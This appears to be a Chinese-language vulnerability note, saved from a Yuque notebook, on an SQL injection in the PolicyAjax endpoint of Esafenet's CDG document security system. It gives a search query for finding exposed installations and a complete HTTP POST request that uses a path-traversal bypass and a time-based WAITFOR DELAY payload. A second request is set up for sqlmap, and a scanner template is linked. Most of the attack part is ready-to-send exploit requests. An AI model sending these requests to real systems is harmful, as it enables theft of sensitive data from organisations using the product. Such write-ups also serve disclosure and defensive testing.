# 亿赛通电子文档安全管理系统PolicyAjax存在SQL注入漏洞

# 一、漏洞简介
 亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统PolicyAjax存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ 亿赛通电子文档安全管理系统

# 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面

![1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6.png](./img/f3AbW-RS96XvK7XY/1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6-693103.png)

# 四、漏洞复现
```plain
POST /CDGServer3/dojojs/../PolicyAjax HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Length: 64
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: no-cache
Connection: close
Content-Type: application/x-www-form-urlencoded
Pragma: no-cache
Upgrade-Insecure-Requests: 1

command=selectOption&id=1';WAITFOR DELAY '0:0:5'--&type=JMCL
```

![1706531531789-5d3e4e10-b8a8-43a3-bca6-fffb757ac467.png](./img/f3AbW-RS96XvK7XY/1706531531789-5d3e4e10-b8a8-43a3-bca6-fffb757ac467-654309.png)

sqlmap

```plain
POST /CDGServer3/dojojs/../PolicyAjax HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Length: 64
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: no-cache
Connection: close
Content-Type: application/x-www-form-urlencoded
Pragma: no-cache
Upgrade-Insecure-Requests: 1

command=selectOption&id=1&type=JMCL
```

![1706531565480-674887a2-8ef1-4fc3-ad2c-5ed7a84ec96c.png](./img/f3AbW-RS96XvK7XY/1706531565480-674887a2-8ef1-4fc3-ad2c-5ed7a84ec96c-451959.png)

[亿赛通电子文档安全管理系统-policyajax-sql注入.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1713621695239-0f1784ad-ca08-49f2-8175-88860849d9db.yaml)



> 更新: 2024-04-20 22:01:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gh6izxum78ql1255>